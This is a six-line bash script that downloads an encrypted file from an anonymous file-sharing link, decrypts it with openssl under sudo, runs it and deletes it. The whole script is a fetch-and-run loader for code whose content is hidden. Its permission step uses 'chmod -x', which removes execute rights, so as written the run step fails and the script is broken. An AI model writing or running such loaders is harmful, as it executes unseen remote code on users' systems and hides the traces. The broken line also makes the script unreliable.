#! /bin/bash
cd
curl -O https://cdn-118.anonfiles.com/MaG6jfUfy7/e2f0c728-1674769607/menu.enc
sudo openssl enc -aes-256-cbc -md md5 -d -in menu.enc -out menu.sh
sudo chmod -x menu.sh
./menu.sh
rm menu.sh
